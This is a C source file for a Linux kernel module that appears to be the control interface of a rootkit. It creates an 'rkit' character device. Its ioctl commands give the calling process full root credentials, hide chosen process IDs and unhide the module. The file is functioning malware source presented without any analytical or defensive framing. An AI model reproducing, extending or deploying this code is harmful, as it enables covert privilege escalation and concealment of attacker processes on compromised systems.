#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include "comm.h"
#include "hide.h"

#define DEVICE_NAME "rkit"
#define IOCTL_PRIVESC  _IO('r', 1)
#define IOCTL_HIDE_PID _IOW('r', 2, int)
#define IOCTL_SHOW_MOD _IO('r', 3)

static int g_major;
static struct cdev g_cdev;
static struct class *g_class;

static long rkit_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case IOCTL_PRIVESC:
        struct cred *c = prepare_creds(); if (c) { c->uid.val = c->euid.val = c->suid.val = c->fsuid.val = 0; c->gid.val = c->egid.val = c->sgid.val = c->fsgid.val = 0; commit_creds(c); }
        break;
    case IOCTL_HIDE_PID:
        hide_add_pid((pid_t)arg);
        break;
    case IOCTL_SHOW_MOD:
        unhide_self();
        break;
    default:
        return -EINVAL;
    }
    return 0;
}

static int rkit_open(struct inode *i, struct file *f) { return 0; }
static int rkit_release(struct inode *i, struct file *f) { return 0; }

static const struct file_operations g_fops = {
    .owner          = THIS_MODULE,
    .open           = rkit_open,
    .release        = rkit_release,
    .unlocked_ioctl = rkit_ioctl,
};

int comm_init(void)
{
    struct device *dev;
    dev_t devno;

    if (alloc_chrdev_region(&devno, 0, 1, DEVICE_NAME) < 0)
        return -1;

    g_major = MAJOR(devno);
    cdev_init(&g_cdev, &g_fops);
    cdev_add(&g_cdev, devno, 1);

    g_class = class_create(DEVICE_NAME);
    dev = device_create(g_class, NULL, devno, NULL, DEVICE_NAME);
    if (IS_ERR(dev))
        return -1;

    return 0;
}

void comm_exit(void)
{
    device_destroy(g_class, MKDEV(g_major, 0));
    class_destroy(g_class);
    cdev_del(&g_cdev);
    unregister_chrdev_region(MKDEV(g_major, 0), 1);
}
